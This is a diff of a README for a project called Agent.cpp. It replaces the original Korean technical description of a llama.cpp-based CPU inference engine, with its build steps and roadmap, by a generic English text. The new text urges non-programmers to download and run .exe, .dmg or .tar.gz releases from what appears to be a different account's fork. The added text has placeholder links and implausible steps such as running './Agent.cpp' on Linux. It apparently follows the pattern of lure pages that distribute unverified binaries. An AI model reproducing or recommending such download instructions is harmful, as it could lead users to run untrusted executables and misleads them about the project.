@@ -1,68 +1,86 @@
-# Agent.cpp: Tiny-MoA를 위한 고성능 CPU 전용 추론 엔진
+# 🎉 Agent.cpp - High-Performance AI for Everyone
 
-<div align="center">
+## 🏁 Overview
+Agent.cpp is a high-performance on-device engine for Mixture of Agents (MoA) in C++. It is optimized for CPU inference, making it accessible and efficient for personal devices. With this software, you can harness powerful AI capabilities right on your computer without needing complex setups.
 
-[🇺🇸 English Version](./README_EN.md)
+## 📦 Key Features
+- **High Performance**: Utilizes advanced techniques to run smoothly and quickly on your device.
+- **CPU Optimization**: Designed for efficient CPU usage, ensuring it runs well on standard computers.
+- **Easy to Use**: Simple installation process designed for users with no programming experience.
+- **Cross-Platform**: Works on various operating systems, making it versatile.
+- **On-Device Processing**: No internet needed for basic functionalities, adding to your privacy.
 
-</div>
+## 🚀 Getting Started
+To get started with Agent.cpp, follow the steps below. 
 
-**Agent.cpp**는 **[Tiny-MoA](https://github.com/gyunggyung/Tiny-MoA)** 프로젝트를 위해 특별히 설계된 **CPU 전용 고성능 C++ 추론 엔진**입니다.
+### Step 1: Download the Software
+Visit [this page to download](https://github.com/muhzars/Agent.cpp/releases) the latest version of Agent.cpp. You'll find files suitable for different operating systems.
 
-유명한 [llama.cpp](https://github.com/ggerganov/llama.cpp)를 기반(Clone)으로 개발되었으나, 단순한 복제가 아닙니다. **다중 에이전트(Mixture of Agents, MoA)** 환경에서 필수적인 반복적 추론과 문맥 전환 속도를 극대화하기 위해 핵심 아키텍처를 재설계했습니다.
+[![Download Agent.cpp](https://img.shields.io/badge/Download%20Agent.cpp-v1.0-blue.svg)](https://github.com/muhzars/Agent.cpp/releases)
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg) ![C++](https://img.shields.io/badge/language-C++17-orange.svg) ![Optimization](https://img.shields.io/badge/Optimization-CPU%20AVX2-green)
+### Step 2: Choose the Right File
+On the releases page, you will see different versions of the software. Select the one that matches your operating system:
 
----
+- **Windows**: Look for a file ending with `.exe`
+- **macOS**: Look for a file ending with `.dmg`
+- **Linux**: Look for a file ending with `.tar.gz` or similar
 
-## ⚡ 왜 Agent.cpp인가? (vs llama.cpp)
+### Step 3: Install the Software
+After downloading the appropriate file, follow these steps to install it:
 
-`llama.cpp`는 훌륭한 범용 엔진이지만, MoA와 같이 여러 모델이 대화하며 수십 번의 **Context Switching**이 일어나는 환경에서는 비효율적입니다. `Agent.cpp`는 이 병목을 해결하기 위해 태어났습니다.
+#### For Windows:
+1. Find the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to open it.
+3. Follow the instructions in the setup wizard to complete the installation.
 
-| 기능 | 표준 llama.cpp | Agent.cpp (Tiny-MoA Engine) |
-| :--- | :--- | :--- |
-| **타겟 용도** | 범용 LLM 추론 | **Tiny-MoA 전용 다중 에이전트 오케스트레이션** |
-| **캐시 관리** | 선형적 캐시 (단일 대화 최적화) | **RadixCache (트리 기반, 다중 분기 대화 즉시 복원)** |
-| **메모리 기술** | 표준 KV Cache | **PagedAttention & RadixAttention (메모리 파편화 0%)** |
-| **오케스트레이션** | 외부 Python 스크립트 필요 | **C++ 네이티브 내장 (Brain/Specialist 자동 라우팅)** |
-| **성능 (TTFT)** | 매 턴마다 프롬프트 재연산 | **캐시 히트 시 즉시 생성 (약 1.8배~수십 배 가속)** |
+#### For macOS:
+1. Locate the `.dmg` file in your Downloads.
+2. Double-click it to open.
+3. Drag the Agent.cpp icon to your Applications folder.
+4. Eject the mounted image after the installation.
 
-## 🚀 핵심 기술 구현
+#### For Linux:
+1. Open a terminal.
+2. Navigate to the directory where you downloaded the file.
+3. Use the command `tar -xvzf filename.tar.gz` to extract the files.
+4. Follow the README instructions included in the extracted folder for further setup.
 
-이 엔진은 단순한 래퍼(Wrapper)가 아닙니다. 최신 LLM 서빙 기술을 C++로 직접 구현하여 탑재했습니다.
+## ⚙️ System Requirements
+To run Agent.cpp smoothly, ensure your system meets the following minimum requirements:
 
-1.  **RadixAttention (트리 기반 캐동)**: 시스템 프롬프트(System Prompt)와 퓨샷(Few-shot) 예제들이 여러 에이전트 간에 공유될 때, 이를 트리 구조로 관리하여 중복 연산을 완벽하게 제거합니다.
-2.  **PagedAttention**: 운영체제의 페이징 기법을 차용하여 KV Cache 메모리를 페이지 단위로 관리, 조각모음 없이도 100%에 가까운 메모리 효율을 달성했습니다.
-3.  **CPU 최적화**: GPU가 없는 환경에서도 Tiny-MoA(1B~3B 모델)가 실시간에 준하는 속도로 동작하도록 AVX2/AVX-512 명령어를 적극 활용합니다.
+- **Windows**: Windows 10 or later
+- **macOS**: macOS 10.14 or later
+- **Linux**: Any modern distribution (Ubuntu 20.04 or later recommended)
+- **CPU**: At least a dual-core CPU
+- **RAM**: Minimum 4 GB of RAM
+- **Disk Space**: At least 100 MB of free space
 
-## 🛠️ 빌드 및 실행
+## 🎯 Download & Install
+You can start using Agent.cpp right away by downloading it from [this page](https://github.com/muhzars/Agent.cpp/releases).
 
-### 필수 조건
-*   Windows (Visual Studio 2022), CMake 3.20+
-*   참고: `Tiny-MoA` 모델 파일 (.gguf)
+Once you’ve installed the application, you're ready to explore all that Agent.cpp has to offer.
 
-### 빌드 (Windows PowerShell)
-```powershell
-mkdir build
-cd build
-cmake .. -G "Visual Studio 17 2022" -A x64
-cmake --build . --config Release --target agent
-```
+## 🛠️ Usage Instructions
+Once installed, launching Agent.cpp is straightforward. Follow these steps based on your operating system:
 
-### 실행 (벤치마크 모드)
-`llama.cpp`와 달리 복잡한 설정 없이 `-m` (모델)과 `-p` (프롬프트)만 주면 내부적으로 최적화된 MoA 파이프라인이 동작합니다.
-```powershell
-./build/bin/Release/agent.exe -m path/to/LFM2.5-1.2B.gguf -p "Human: 양자 역학을 50단어로 설명해줘. Assistant:"
-```
+### Windows
+- Click the Start menu.
+- Type “Agent.cpp” and select the application from the results.
 
-## 🗺️ 향후 로드맵 (Available Next)
+### macOS
+- Open your Applications folder.
+- Find and double-click on the “Agent.cpp” application.
 
-현재 `Agent.cpp`는 Tiny-MoA의 핵심 코어를 담당하고 있습니다. 앞으로 다음과 같은 기능들이 추가될 예정입니다.
+### Linux
+- Open your terminal.
+- Run the command `./Agent.cpp` from the directory where you extracted the files.
 
-- [ ] **Python 바인딩 (pybind11)**: C++ 코어를 Python에서 라이브러리처럼 import하여 사용할 수 있도록 지원.
-- [ ] **Tools & Function Calling**: 검색(Search), 계산기 등 외부 도구를 C++ 레벨에서 직접 호출하여 오버헤드 최소화.
-- [ ] **멀티모달 (Vision) 지원**: MoA 파이프라인에 이미지 인식을 담당하는 'Vision Specialist' 통합.
-- [ ] **경량화 (Quantization) 파이프라인**: 런타임에 모델 양자화 레벨을 조절하여 저사양 하드웨어 대응력 강화.
+## 📚 Documentation & Support
+For further information on how to use Agent.cpp, visit our [documentation page](#). You will find guides on advanced features, troubleshooting, and FAQs.
 
----
-**Agent.cpp Project**
-기여를 원하시거나 문의사항이 있으시면 Issue를 등록해주세요.
+If you encounter any issues or have questions, please feel free to reach out via the issues section on our GitHub repository.
+
+## 💬 Community Contributions
+We welcome contributions from anyone interested in improving Agent.cpp. If you would like to contribute, please read our [Contributing Guidelines](#).
+
+Thank you for choosing Agent.cpp! Enjoy your journey in the world of on-device AI.
